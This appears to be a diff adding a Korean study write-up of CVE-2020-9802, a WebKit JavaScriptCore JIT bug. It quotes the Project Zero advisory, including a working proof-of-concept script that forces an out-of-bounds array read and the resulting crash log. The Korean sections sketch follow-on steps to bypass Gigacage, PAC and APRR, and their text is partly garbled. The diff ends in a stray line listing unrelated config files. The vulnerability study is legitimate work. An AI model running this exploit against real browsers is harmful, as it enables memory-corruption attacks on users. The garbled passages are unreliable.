@@ -1,0 +1,217 @@
+### 1. 취약점 원인
+2.28.3 WebKit의 JIT 컴파일러에서 범위를 벗어난 읽기/쓰기에 관한 취약점이다. JIT 컴파일러의 최적화 단계 중에서 작업에서 정수 오버플로가 발생한다. ArithNegate 크기가 음수인 정수를 만들면 INT_MIN(*-2147483648) 정수(-INT_MIN)가 오버플로되어 INT_MIN 다시 같은 결과가 발생한다. ArithNegate 이러한 부적절한 계산을 통해 JIT 컴파일러는 정수 값의 결과가 항상 음수라고 생각해 JIT 컴파일러가 정수 값에 대해 오버플로 검사를 제거하는 검사되지 않은 작업을 생성할 수 있다. 확인되지 않은 작업 정수를 배열의 인덱싱 값으로 사용하면 ArithNegate 범위를 벗어난 읽기/쓰기 조건이 발생할 수 있다.
+
+### 2. 환경구축 및 익스플로잇
+sudo python3 -m pip install tornado
+python3 server.py
+
+## https://sploitus.com/exploit?id=PACKETSTORM:157926
+JSC: JIT: Incorrect Common Subexpression Elimination for ArithNegate, leading to OOB accesses
+
+The DFG and FTL JIT compilers incorrectly replace Checked with Unchecked ArithNegate operations (and vice versa) during Common Subexpression Elimination. This can then be exploited to cause out-of-bounds accesses and potentially other memory safety violations.
+
+# Background: Common Subexpression Elimination
+
+Consider the following JS code:
+
+let c = a + b;
+let d = a + b;
+
+Assume further that a and b are 32 bit integer values, then a JS JIT compiler can convert the code to the following:
+
+let c = a + b;
+let d = c;
+
+And that way save one ArithAdd operation at runtime. This optimization is called Common Subexpression Elimination (CSE) [1].
+
+Now, consider the following JS code instead:
+
+let c = o.a;
+f();
+let d = o.a;
+
+Here, the compiler can not eliminate the 2nd property load operation during CSE as the function call in between could have changed the value of the .a property.
+
+The modelling of whether an operation can be subject to CSE and under which circumstances is done in DFGClobberrize. For ArithAdd, DFGClobberize contains [2]:
+
+case ArithAdd:
+def(PureValue(node, node->arithMode()));
+
+PureValue here means that the computation does not rely on the context and thus that the computation performed on the same inputs will always yield the same result regardless of the context in which it executes. In contrast, for GetByOffset (which can be used for the property load), DFGClobberize contains [3]:
+
+case GetByOffset:
+unsigned identifierNumber = node->storageAccessData().identifierNumber;
+AbstractHeap heap(NamedProperties, identifierNumber);
+read(heap);
+def(HeapLocation(NamedPropertyLoc, heap, node->child2()), LazyNode(node));
+
+This in essense says that the value produced by this operation depends on the NamedProperty \"abstract heap\". As such, eliminating a 2nd GetByOffset is only sound if there are no writes to the NamedProperties abstract heap (i.e. to memory locations containing property values) between the two GetByOffset operations.
+
+# The Bug
+
+For the ArithNegate operation, DFGClobberrize contains [4]:
+
+case ArithNegate:
+if (node->child1().useKind() == Int32Use
+|| node->child1().useKind() == DoubleRepUse
+|| node->child1().useKind() == Int52RepUse)
+def(PureValue(node));
+
+This states that if the inputs are known to be integers or doubles, then any two ArithNegate operations with the same input node can always be substituted for each other by CSE.
+
+However, the ArithNegate operation comes in different \"flavours\", for example as Checked or Unchecked negation [5], indicating whether the operation will perform an overflow check at runtime or not. To see why a Checked ArithNegate is usually necessary, consider the 32 bit integer negation of -2147483648, which, as it is INT_MIN, will again result in -2147483648. As this would normally be incorrect for a JavaScript value (in JS all numbers are supposed to behave as 64bit floating point values, so negating -2147483648 should become 2147483648), an overflow check normally has to be performed, and, if that fails, a bailout needs to happen.
+
+As the modelling in DFGClobberrize does not include the ArithMode (Checked or Unchecked), the compiler will convert
+
+let x = -i; // Without overflow check, -2147483648 again becomes -2147483648
+let y = -i; // With overflow check, -2147483648 causes a bailout due to overflow
+
+into
+
+let x = -i; // Without overflow check
+let y = x; // Incorrect, didn't check for overflow!
+
+Which is incorrect.
+
+# Triggering the Bug
+
+It doesn't seem straight-forward to trigger the bug with two consecutive ArithNegate operations as the compiler seems to normally convert the inputs to doubles prior to the ArithNegate, thus not leading to issues as no overflow checks are required anyway.
+
+However, there is an interesting case in the IntegerRangeOptimization phase that can be used to trigger this bug. Given the following code:
+
+function f(n) {
+// Must not have a zero constant in this function due to this bug: https://bugs.webkit.org/show_bug.cgi?id=200018
+
+// Force n to be a 32bit integer
+n &= 0xffffffff;
+
+// Teach the IntegerRangeOptimization that n will be a negative number inside the if
+if (n < -1) {
+// Force \"non-number bytecode usage\" so the negation becomes unchecked
+let v = (-n)&0xffffffff;
+
+// As n is known to be negative here, this ArithAbs will become a ArithNegate.
+// That negation will be checked, but then be CSE'd for the previous, unchecked one...
+return Math.abs(n);
+}
+}
+
+Here is what will happen during DFG compilation:
+
+First, during the DFGFixup phase, the negation ((-n)&0xffffffff) is converted to an unchecked ArithNegate as the result is not used as a number but just a 32 bit integer, in which case an overflow is non observable [6].
+
+Next, in the IntegerRangeOptimization the compiler marks n as being a negative number when inside the body of the if statement [7], then marks the output of the ArithAbs operation as being a positive number with this code [8]
+
+case ArithAbs: {
+if (node->child1().useKind() != Int32Use)
+break;
+setRelationship(Relationship(node, m_zero, Relationship::GreaterThan, -1));
+break;
+
+Afterwards, still in the same phase, the ArithAbs is transformed by this code snippet [9]:
+
+case ArithAbs: {
+...;
+
+if (maxValue < 0 || (absIsUnchecked && maxValue <= 0)) {
+node->convertToArithNegate();
+...;
+
+Here, as the input to the ArithAbs is known to be a negative number, the ArithAbs is replaced with a Checked (necessary to correctly handle the INT_MIN case) ArithNegate operation.
+
+Finally, the GlobalCSE phase runs and replaces the new, checked, ArithNegate with the previous, unchecked, ArithNegate operation.
+At this point the emitted code behaves incorrectly when passed INT_MIN as input:
+
+f(-2147483648);
+// returns -2147483648
+
+
+# Causing Memory Safety Violations
+
+It is possible to exploit this bug to cause a memory safety violation by again abusing the IntegerRangeOptimization pass to incorrectly eliminate a bounds check. There may also exist other ways in which this bug can be exploited.
+
+The following code leads to an out-of-bounds access on an array after being JIT compiled by DFG/FTL:
+
+const ITERATIONS = 1000000;
+
+function f(n) {
+// Must not have a zero constant in this function due to this bug: https://bugs.webkit.org/show_bug.cgi?id=200018
+
+// Force n to be a 32bit integer
+n &= 0xffffffff;
+
+// Teach the IntegerRangeOptimization that n will be a negative number inside the if
+if (n < -1) {
+// Force \"non-number bytecode usage\" so the negation becomes unchecked
+let v = (-n)&0xffffffff;
+
+// As n is known to be negative here, this ArithAbs will become a ArithNegate.
+// That negation will be checked, but then be incorrectly CSE'd for the previous, unchecked one.
+let i = Math.abs(n);
+
+// However, the IntegerRangeOptimization pass has also marked i as being >= 0...
+
+let arr = new Array(10);
+arr.fill(42.42);
+
+if (i < arr.length) {
+// .. so here IntegerRangeOptimization believes i will be in the range
+// [0, arr.length) and thus eliminates the CheckBounds node.
+// Howver, when given INT_MIN as input, i will, due to the bug,
+// actually also be INT_MIN here, thus leading to an OOB access.
+return arr[i];
+}
+}
+}
+
+for (let i = 0; i < ITERATIONS; i++) {
+let isLastIteration = i == ITERATIONS - 1;
+let n = -(i % 10);
+if (isLastIteration) {
+n = -2147483648;
+}
+f(n);
+}
+
+/*
+lldb -- /System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc poc.js
+(lldb) r
+Process 12237 launched: '/System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc' (x86_64)
+Process 12237 stopped
+* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x1c1fc61348)
+frame #0: 0x000051fcfaa06f2e
+-> 0x51fcfaa06f2e: movsd xmm0, qword ptr [rax + 8*rcx] ; xmm0 = mem[0],zero
+0x51fcfaa06f33: ucomisd xmm0, xmm0
+0x51fcfaa06f37: jp 0x51fcfaa0707f
+0x51fcfaa06f3d: movq rax, xmm0
+Target 0: (jsc) stopped.
+(lldb) reg read rcx
+rcx = 0x0000000080000000
+*/
+
+The main trick here is to use an additional if conditional to trick the IntegerRangeOptimization into removing a CheckBounds node as it (correctly) believes that the result of ArithAbs must be a positive integer. However, due to the incorrect CSE, the result of ArithAbs will actually be INT_MIN in the last iteration, thus causing an out-of-bounds access. It is probably also possible to modify the code in such a way that the out-of-bounds access happens with an index other than INT_MIN.
+
+Note that the above PoC does not always crash as JSC seems to allocate huge memory regions, causing the OOB array access to sometimes still land in mapped memory.
+
+It is probably worth checking other operations for similar bugs in DFGClobberize. For example, ArithAbs looks like it might suffer from a very similar bug.
+
+This bug is subject to a 90 day disclosure deadline. After 90 days elapse,
+the bug report will become visible to the public. The scheduled disclosure
+date is 2020-06-03. Disclosure at an earlier date is also possible if
+agreed upon by all parties.
+
+
+Related CVE Numbers: CVE-2020-9802Fixed-2020-May-20.
+
+
+### 3. 실습
+StructureID에 대해 JSArray에 대한 인덱스 액세스는 구조를 로드하지 않고, JSCell 헤더 플래스와 배열 저장소만 로드한다. 이를 통해 jsaRRAY를 위조하고, 유효한 jscELL 헤더를 읽어 메모리에 유효한 StructureID를 읽는 것이 가능해진다. 또 다른 우회로 Gigacage는 임의의 메모리 읽기/쓰기가 남용되지 않도록 TypedArray 및 문자열과 같은 객체의 백업 버퍼를 케이지하는데 사용된다. 스택의 데이터를 덮어쓸 수 있는 경우 버그로 인해 Gigacage 메커니즘을 우회할 수 있다. JIT컴파일 코드의 형식화된 배열에 대한 액세스는 DFG와 GetByVal로 구분된다. 
+
+실행 결과에서 [LOG] Received message from worker:에서 충돌을 처리하고, 인증된 포인터를 보유한 레지스터를 수정한 다음 스레드를 계속해 TypedArray의 백업 저장소 포인터를 보호하는 PAC를 우외한 것이다. 다음 형식화된 배열 액세스 값을 읽는다.
+
+### 4. PoC
+MACOS에서 단순히 JIT 영역을 찾는 것이다. iOS에서 APRR과 PAC의 조합이 읽기/쓰기를 통해 공격자로부터 JIT 영역을 보호한다. WebKit은 프로세스 내 신호 처리를 한다. JSC의 일부 JIT 최적화에서 사용된다. 기본 신호 처리기는 catch_mach_exception_raise_stateSignals.cpp에 있으며, 연결된 처리기 목록을 순회하고 각 처리기를 호출한다. 핸들러 중 하나라도 성공하면 신호는 처리되고, 스레드가 계속된다.
+
+핸들러의 연결된 목록은 신호를 받으면 무한 루프가 발생한다. WebWorker와 같은 다른 스레드에서 충돌이 발생한다. 충돌한 스레드는 이제 공격자가 제어하는 ​​레지스터 및 스택 콘텐츠를 사용해 실행을 재개한다. 목록/주기의 복사본을 만든 다음 현재 비활성 처리기 목록을 복구하기 전에 "활성" 및 "비활성" 예외 처리기 목록을 교환하여 서로 이어지는 여러 신호를 포착할 수 있어야 한다. activeExceptions 신호 처리기를 설치하기 전에 Signals.cpp의 전역 변수를 수정해 공격자가 처리되는 예외를 제어할 수 있어야 한다는 점도 주목할 가치가 있다.
+
+++ appweb.conf, docker-compose.yml
